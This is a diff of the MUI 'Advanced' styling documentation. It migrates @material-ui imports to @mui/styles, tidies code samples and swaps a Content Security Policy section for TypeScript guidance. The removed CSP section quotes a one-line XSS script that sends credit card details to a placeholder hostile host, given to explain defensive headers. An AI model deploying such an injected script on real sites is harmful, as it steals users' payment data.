@@ -1,15 +1,17 @@
 # Advanced
 
-<p class="description">This section covers more advanced usage of @material-ui/core/styles.</p>
+<p class="description">This section covers more advanced usage of @mui/styles.</p>
+
+> **Note**: `@mui/styles` is the _**legacy**_ styling solution for MUI. It is deprecated in v5. It depends on [JSS](https://cssinjs.org/) as a styling solution, which is not used in the `@mui/material` anymore. If you don't want to have both emotion & JSS in your bundle, please refer to the [`@mui/system`](/system/basics/) documentation which is the recommended alternative.
 
 ## Theming
 
 Add a `ThemeProvider` to the top level of your app to pass a theme down the React component tree. Then, you can access the theme object in style functions.
 
-> This example creates a theme object for custom-built components. If you intend to use some of the Material-UI's components you need to provide a richer theme structure using the `createTheme()` method. Head to the the [theming section](/customization/theming/) to learn how to build your custom Material-UI theme.
+> This example creates a theme object for custom-built components. If you intend to use some of the MUI's components you need to provide a richer theme structure using the `createTheme()` method. Head to the [theming section](/customization/theming/) to learn how to build your custom MUI theme.
 
 ```jsx
-import { ThemeProvider } from '@material-ui/core/styles';
+import { ThemeProvider } from '@mui/styles';
 import DeepChild from './my_components/DeepChild';
 
 const theme = {
@@ -36,7 +38,7 @@ You might need to access the theme variables inside your React components.
 For use in function components:
 
 ```jsx
-import { useTheme } from '@material-ui/core/styles';
+import { useTheme } from '@mui/styles';
 
 function DeepChild() {
   const theme = useTheme();
@@ -51,7 +53,7 @@ function DeepChild() {
 For use in class or function components:
 
 ```jsx
-import { withTheme } from '@material-ui/core/styles';
+import { withTheme } from '@mui/styles';
 
 function DeepChildRaw(props) {
   return <span>{`spacing ${props.theme.spacing}`}</span>;
@@ -106,16 +108,15 @@ const useStyles = makeStyles({
 function Nested(props) {
   const classes = useStyles();
   return (
-    <button className={classes.root}> // 'jss1'
-      <span className={classes.label}> // 'jss2'
-        nested
-      </span>
+    <button className={classes.root}>
+      {/* 'jss1' */}
+      <span className={classes.label}>{/* 'jss2' nested */}</span>
     </button>
   );
 }
 
 function Parent() {
-  return <Nested />
+  return <Nested />;
 }
 ```
 
@@ -123,7 +124,7 @@ However, the class names are often non-deterministic. How can a parent component
 
 ### `withStyles`
 
-This is the simplest case. the wrapped component accepts a `classes` prop,
+This is the simplest case. The wrapped component accepts a `classes` prop,
 it simply merges the class names provided with the style sheet.
 
 ```jsx
@@ -132,14 +133,12 @@ const Nested = withStyles({
   label: {}, // a nested style rule
 })(({ classes }) => (
   <button className={classes.root}>
-    <span className={classes.label}> // 'jss2 my-label'
-      Nested
-    </span>
+    <span className={classes.label}>{/* 'jss2 my-label' Nested*/}</span>
   </button>
 ));
 
 function Parent() {
-  return <Nested classes={{ label: 'my-label' }} />
+  return <Nested classes={{ label: 'my-label' }} />;
 }
 ```
 
@@ -157,15 +156,13 @@ function Nested(props) {
   const classes = useStyles(props);
   return (
     <button className={classes.root}>
-      <span className={classes.label}> // 'jss2 my-label'
-        nested
-      </span>
+      <span className={classes.label}>{/* 'jss2 my-label' nested */}</span>
     </button>
   );
 }
 
 function Parent() {
-  return <Nested classes={{ label: 'my-label' }} />
+  return <Nested classes={{ label: 'my-label' }} />;
 }
 ```
 
@@ -174,7 +171,7 @@ function Parent() {
 JSS uses plugins to extend its core, allowing you to cherry-pick the features you need,
 and only pay the performance overhead for what you are using.
 
-Not all the plugins are available in Material-UI by default. The following (which is a subset of
+Not all the plugins are available in MUI by default. The following (which is a subset of
 [jss-preset-default](https://cssinjs.org/jss-preset-default/)) are included:
 
 - [jss-plugin-rule-value-function](https://cssinjs.org/jss-plugin-rule-value-function/)
@@ -189,19 +186,15 @@ Of course, you are free to use additional plugins. Here is an example with the [
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
-import rtl from 'jss-rtl'
+import { StylesProvider, jssPreset } from '@mui/styles';
+import rtl from 'jss-rtl';
 
 const jss = create({
   plugins: [...jssPreset().plugins, rtl()],
 });
 
 export default function App() {
-  return (
-    <StylesProvider jss={jss}>
-      ...
-    </StylesProvider>
-  );
+  return <StylesProvider jss={jss}>...</StylesProvider>;
 }
 ```
 
@@ -231,8 +224,8 @@ Note that this doesn't support selectors, or nested rules.
 ## CSS injection order
 
 > It's **really important** to understand how the CSS specificity is calculated by the browser,
-as it's one of the key elements to know when overriding styles.
-You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)
+> as it's one of the key elements to know when overriding styles.
+> You are encouraged to read this MDN paragraph: [How is specificity calculated?](https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#How_is_specificity_calculated)
 
 By default, the style tags are injected **last** in the `<head>` element of the page.
 They gain more specificity than any other style tags on your page e.g. CSS modules, styled components.
@@ -242,12 +235,12 @@ They gain more specificity than any other style tags on your page e.g. CSS modul
 The `StylesProvider` component has an `injectFirst` prop to inject the style tags **first** in the head (less priority):
 
 ```jsx
-import { StylesProvider } from '@material-ui/core/styles';
+import { StylesProvider } from '@mui/styles';
 
 <StylesProvider injectFirst>
   {/* Your component tree.
-      Styled components can override Material-UI's styles. */}
-</StylesProvider>
+      Styled components can override MUI's styles. */}
+</StylesProvider>;
 ```
 
 ### `makeStyles` / `withStyles` / `styled`
@@ -256,7 +249,7 @@ The injection of style tags happens in the **same order** as the `makeStyles` / 
 
 ```jsx
 import clsx from 'clsx';
-import { makeStyles } from '@material-ui/core/styles';
+import { makeStyles } from '@mui/styles';
 
 const useStylesBase = makeStyles({
   root: {
@@ -276,7 +269,7 @@ export default function MyComponent() {
   const classesBase = useStylesBase();
 
   // Order doesn't matter
-  const className = clsx(classes.root, classesBase.root)
+  const className = clsx(classes.root, classesBase.root);
 
   // color: red 🔴 wins.
   return <div className={className} />;
@@ -297,13 +290,13 @@ The simplest approach is to add an HTML comment to the `<head>` that determines 
 ```html
 <head>
   <!-- jss-insertion-point -->
-  <link href="...">
+  <link href="..." />
 </head>
 ```
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
+import { StylesProvider, jssPreset } from '@mui/styles';
 
 const jss = create({
   ...jssPreset(),
@@ -330,7 +323,7 @@ To get around this issue, you can provide a DOM element (other than a comment) a
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
+import { StylesProvider, jssPreset } from '@mui/styles';
 
 const jss = create({
   ...jssPreset(),
@@ -350,7 +343,7 @@ To get around this issue, you can use the JavaScript `document.createComment()` 
 
 ```jsx
 import { create } from 'jss';
-import { StylesProvider, jssPreset } from '@material-ui/core/styles';
+import { StylesProvider, jssPreset } from '@mui/styles';
 
 const styleNode = document.createComment('jss-insertion-point');
 document.head.insertBefore(styleNode, document.head.firstChild);
@@ -368,11 +361,11 @@ export default function App() {
 
 ## Server-side rendering
 
-This example returns a string of HTML and inlines the critical CSS required, right before it’s used:
+This example returns a string of HTML and inlines the critical CSS required, right before it's used:
 
 ```jsx
 import ReactDOMServer from 'react-dom/server';
-import { ServerStyleSheets } from '@material-ui/core/styles';
+import { ServerStyleSheets } from '@mui/styles';
 
 function render() {
   const sheets = new ServerStyleSheets();
@@ -398,14 +391,18 @@ You can [follow the server side guide](/guides/server-rendering/) for a more det
 
 ### Gatsby
 
-There is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@material-ui/styles`.
+There is [an official Gatsby plugin](https://github.com/hupe1980/gatsby-plugin-material-ui) that enables server-side rendering for `@mui/styles`.
 Refer to the plugin's page for setup and usage instructions.
+
+<!-- #default-branch-switch -->
 
 Refer to [this example Gatsby project](https://github.com/mui-org/material-ui/blob/master/examples/gatsby) for an up-to-date usage example.
 
 ### Next.js
 
-You need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/master/examples/nextjs/pages/_document.js) to inject the server-side rendered styles into the `<head>` element.
+You need to have a custom `pages/_document.js`, then copy [this logic](https://github.com/mui-org/material-ui/blob/814fb60bbd8e500517b2307b6a297a638838ca89/examples/nextjs/pages/_document.js#L52-L59) to inject the server-side rendered styles into the `<head>` element.
+
+<!-- #default-branch-switch -->
 
 Refer to [this example project](https://github.com/mui-org/material-ui/blob/master/examples/nextjs) for an up-to-date usage example.
 
@@ -415,7 +412,7 @@ The class names are generated by [the class name generator](/styles/api/#createg
 
 ### Default
 
-By default, the class names generated by `@material-ui/core/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:
+By default, the class names generated by `@mui/styles` are **non-deterministic**; you can't rely on them to stay the same. Let's take the following style as an example:
 
 ```js
 const useStyles = makeStyles({
@@ -449,73 +446,11 @@ const identifier = 123;
 const className = `${productionPrefix}-${identifier}`;
 ```
 
-### With `@material-ui/core`
-
-The generated class names of the `@material-ui/core` components behave differently.
-When the following conditions are met, the class names are **deterministic**:
+However, when the following conditions are met, the class names are **deterministic**:
 
 - Only one theme provider is used (**No theme nesting**)
-- The style sheet has a name that starts with `Mui` (all Material-UI components).
+- The style sheet has a name that starts with `Mui` (all MUI components).
 - The `disableGlobal` option of the [class name generator](/styles/api/#creategenerateclassname-options-class-name-generator) is `false` (the default).
-
-These conditions are met with the most common use cases of `@material-ui/core`.
-For instance, this style sheet:
-
-```jsx
-const useStyles = makeStyles({
-  root: { /* … */ },
-  label: { /* … */ },
-  outlined: {
-    /* … */
-    '&$disabled': { /* … */ },
-  },
-  outlinedPrimary: {
-    /* … */
-    '&:hover': { /* … */ },
-  },
-  disabled: {},
-}, { name: 'MuiButton' });
-```
-
-generates the following class names that you can override:
-
-```css
-.MuiButton-root { /* … */ }
-.MuiButton-label { /* … */ }
-.MuiButton-outlined { /* … */ }
-.MuiButton-outlined.Mui-disabled { /* … */ }
-.MuiButton-outlinedPrimary: { /* … */ }
-.MuiButton-outlinedPrimary:hover { /* … */ }
-```
-
-*This is a simplification of the `@material-ui/core/Button` component's style sheet.*
-
-Customization of the TextField can be cumbersome with the [`classes` API](#overriding-styles-classes-prop), where you have to define the the classes prop.
-It's easier to use the default values, as described above. For example:
-
-```jsx
-import styled from 'styled-components';
-import { TextField } from '@material-ui/core';
-
-const StyledTextField = styled(TextField)`
-  label.focused {
-    color: green; 💚
-  }
-  .MuiOutlinedInput-root {
-    fieldset {
-      border-color: red; 💔
-    }
-    &:hover fieldset {
-      border-color: yellow; 💛
-    }
-    &.Mui-focused fieldset {
-      border-color: green; 💚
-    }
-  }
-`;
-```
-
-{{"demo": "pages/styles/advanced/GlobalClassName.js"}}
 
 ## Global CSS
 
@@ -537,60 +472,206 @@ You can also combine JSS generated class names with global ones.
 JSS uses feature detection to apply the correct prefixes.
 [Don't be surprised](https://github.com/mui-org/material-ui/issues/9293) if you can't see a specific prefix in the latest version of Chrome. Your browser probably doesn't need it.
 
-## Content Security Policy (CSP)
+## TypeScript usage
 
-### What is CSP and why is it useful?
+Using `withStyles` in TypeScript can be a little tricky, but there are some utilities to make the experience as painless as possible.
 
-Basically, CSP mitigates cross-site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://example.com` the CSP header `default-src: 'self';` will allow all assets that are located at `https://example.com/*` and deny all others. If there is a section of your website that is vulnerable to XSS where unescaped user input is displayed, an attacker could input something like:
+### Using `createStyles` to defeat type widening
 
-```html
-<script>
-  sendCreditCardDetails('https://hostile.example');
-</script>
+A frequent source of confusion is TypeScript's [type widening](https://mariusschulz.com/blog/typescript-2-1-literal-type-widening), which causes this example not to work as expected:
+
+```ts
+const styles = {
+  root: {
+    display: 'flex',
+    flexDirection: 'column',
+  },
+};
+
+withStyles(styles);
+//         ^^^^^^
+//         Types of property 'flexDirection' are incompatible.
+//           Type 'string' is not assignable to type '"-moz-initial" | "inherit" | "initial" | "revert" | "unset" | "column" | "column-reverse" | "row"...'.
 ```
 
-This vulnerability would allow the attacker to execute anything. However, with a secure CSP header, the browser will not load this script.
+The problem is that the type of the `flexDirection` prop is inferred as `string`, which is too wide. To fix this, you can pass the styles object directly to `withStyles`:
 
-You can read more about CSP on the [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
-
-### How does one implement CSP?
-
-In order to use CSP with Material-UI (and JSS), you need to use a nonce. A nonce is a randomly generated string that is only used once, therefore you need to add server middleware to generate one on each request. JSS has a [great tutorial](https://github.com/cssinjs/jss/blob/master/docs/csp.md) on how to achieve this with Express and React Helmet. For a basic rundown, continue reading.
-
-A CSP nonce is a Base 64 encoded string. You can generate one like this:
-
-```js
-import uuidv4 from 'uuid/v4';
-
-const nonce = new Buffer(uuidv4()).toString('base64');
+```ts
+withStyles({
+  root: {
+    display: 'flex',
+    flexDirection: 'column',
+  },
+});
 ```
 
-It is very important that you use UUID version 4, as it generates an **unpredictable** string.
-You then apply this nonce to the CSP header. A CSP header might look like this with the nonce applied:
+However type widening rears its ugly head once more if you try to make the styles depend on the theme:
 
-```js
-header('Content-Security-Policy')
-  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
+```ts
+withStyles(({ palette, spacing }) => ({
+  root: {
+    display: 'flex',
+    flexDirection: 'column',
+    padding: spacing.unit,
+    backgroundColor: palette.background.default,
+    color: palette.primary.main,
+  },
+}));
 ```
 
-If you are using Server-Side Rendering (SSR), you should pass the nonce in the `<style>` tag on the server.
+This is because TypeScript [widens the return types of function expressions](https://github.com/Microsoft/TypeScript/issues/241).
 
-```jsx
-<style
-  id="jss-server-side"
-  nonce={nonce}
-  dangerouslySetInnerHTML={{ __html: sheets.toString() }}
-/>
+Because of this, using the `createStyles` helper function to construct your style rules object is recommended:
+
+```ts
+// Non-dependent styles
+const styles = createStyles({
+  root: {
+    display: 'flex',
+    flexDirection: 'column',
+  },
+});
+
+// Theme-dependent styles
+const styles = ({ palette, spacing }: Theme) =>
+  createStyles({
+    root: {
+      display: 'flex',
+      flexDirection: 'column',
+      padding: spacing.unit,
+      backgroundColor: palette.background.default,
+      color: palette.primary.main,
+    },
+  });
 ```
 
-Then, you must pass this nonce to JSS so it can add it to subsequent `<style>` tags.
+`createStyles` is just the identity function; it doesn't "do anything" at runtime, just helps guide type inference at compile time.
 
-The way that you do this is by passing a `<meta property="csp-nonce" content={nonce} />` tag in the `<head>` of your HTML.  JSS will then, by convention, look for a `<meta property="csp-nonce"` tag and use the `content` value as the nonce.
+### Media queries
 
-You must include this header regardless of whether or not SSR is used. Here is an example of what a fictional header could look like:
+`withStyles` allows a styles object with top level media-queries like so:
 
-```html
-<head>
-  <meta property="csp-nonce" content="this-is-a-nonce-123" />
-</head>
+```ts
+const styles = createStyles({
+  root: {
+    minHeight: '100vh',
+  },
+  '@media (min-width: 960px)': {
+    root: {
+      display: 'flex',
+    },
+  },
+});
 ```
+
+To allow these styles to pass TypeScript however, the definitions have to be unambiguous concerning the names for CSS classes and actual CSS property names. Due to this, class names that are equal to CSS properties should be avoided.
+
+```ts
+// error because TypeScript thinks `@media (min-width: 960px)` is a class name
+// and `content` is the CSS property
+const ambiguousStyles = createStyles({
+  content: {
+    minHeight: '100vh',
+  },
+  '@media (min-width: 960px)': {
+    content: {
+      display: 'flex',
+    },
+  },
+});
+
+// works just fine
+const ambiguousStyles = createStyles({
+  contentClass: {
+    minHeight: '100vh',
+  },
+  '@media (min-width: 960px)': {
+    contentClass: {
+      display: 'flex',
+    },
+  },
+});
+```
+
+### Augmenting your props using `WithStyles`
+
+Since a component decorated with `withStyles(styles)` gets a special `classes` prop injected, you will want to define its props accordingly:
+
+```ts
+const styles = (theme: Theme) =>
+  createStyles({
+    root: {
+      /* ... */
+    },
+    paper: {
+      /* ... */
+    },
+    button: {
+      /* ... */
+    },
+  });
+
+interface Props {
+  // non-style props
+  foo: number;
+  bar: boolean;
+  // injected style props
+  classes: {
+    root: string;
+    paper: string;
+    button: string;
+  };
+}
+```
+
+However this isn't very [DRY](https://en.wikipedia.org/wiki/Don%27t_repeat_yourself) because it requires you to maintain the class names (`'root'`, `'paper'`, `'button'`, ...) in two different places. We provide a type operator `WithStyles` to help with this, so that you can just write:
+
+```ts
+import { createStyles } from '@mui/styles';
+import { WithStyles } from '@mui/material';
+
+const styles = (theme: Theme) =>
+  createStyles({
+    root: {
+      /* ... */
+    },
+    paper: {
+      /* ... */
+    },
+    button: {
+      /* ... */
+    },
+  });
+
+interface Props extends WithStyles<typeof styles> {
+  foo: number;
+  bar: boolean;
+}
+```
+
+### Decorating components
+
+Applying `withStyles(styles)` as a function works as expected:
+
+```tsx
+const DecoratedSFC = withStyles(styles)(({ text, type, color, classes }: Props) => (
+  <Typography variant={type} color={color} classes={classes}>
+    {text}
+  </Typography>
+));
+
+const DecoratedClass = withStyles(styles)(
+  class extends React.Component<Props> {
+    render() {
+      const { text, type, color, classes } = this.props;
+      return (
+        <Typography variant={type} color={color} classes={classes}>
+          {text}
+        </Typography>
+      );
+    }
+  },
+);
+```
+
+Unfortunately due to a [current limitation of TypeScript decorators](https://github.com/Microsoft/TypeScript/issues/4881), `withStyles(styles)` can't be used as a decorator in TypeScript.
